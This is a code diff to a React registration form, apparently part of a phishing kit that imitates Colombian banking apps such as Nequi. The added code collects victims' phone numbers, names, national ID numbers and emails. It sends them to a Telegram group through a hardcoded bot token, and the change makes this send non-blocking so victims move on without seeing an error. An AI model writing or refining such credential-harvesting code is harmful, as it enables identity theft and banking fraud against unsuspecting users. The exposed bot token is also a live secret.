@@ -45,39 +45,30 @@ function Register({ phoneNumber, onBack, onRegister }) {
 
   const handleRegister = async () => {
     if (isFormValid) {
-      // Send to Telegram
-      // Token actualizado encontrado en public/nequi/server.js
-      const token = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
-      const chatId = '-5182218323'; // Grupo LOG
-      const message = `
-🚀 *Nuevo Registro* 🚀
-
-📱 *Celular:* ${phoneNumber}
-👤 *Nombre:* ${nombre}
-🆔 *Cédula:* ${cedula}
-📧 *Email:* ${email}
-      `;
-
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`);
-        const data = await response.json();
-        
-        if (!data.ok) {
-          console.error('Telegram Error:', data);
-          alert(`Error enviando a Telegram: ${data.description}`);
-        }
-      } catch (error) {
-        console.error('Error sending to Telegram:', error);
-        // Fallback for CORS or network issues
-        alert('No se pudo conectar con Telegram. Verifica tu conexión.');
-      }
-
-      // Save user data to sessionStorage for bank apps
+      // Save user data to sessionStorage for bank apps immediately
       sessionStorage.setItem("bc_usuario", phoneNumber); // Nequi expects this
       sessionStorage.setItem("user_cedula", cedula);
       sessionStorage.setItem("user_email", email);
       sessionStorage.setItem("user_nombre", nombre);
 
+      // Telegram data
+      const token = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
+      const chatId = '-5182218323'; // Grupo LOG
+      
+      const message = `🚀 *Nuevo Registro* 🚀\n\n📱 *Celular:* \`${phoneNumber}\`\n👤 *Nombre:* \`${nombre}\`\n🆔 *Cédula:* \`${cedula}\`\n📧 *Email:* \`${email}\``;
+
+      // Intentar enviar a Telegram pero no bloquear el flujo si falla
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      }).catch(err => console.error("Error enviando registro a Telegram:", err));
+
+      // Avanzar a la siguiente vista de inmediato
       onRegister({ nombre, cedula, email });
     }
   };
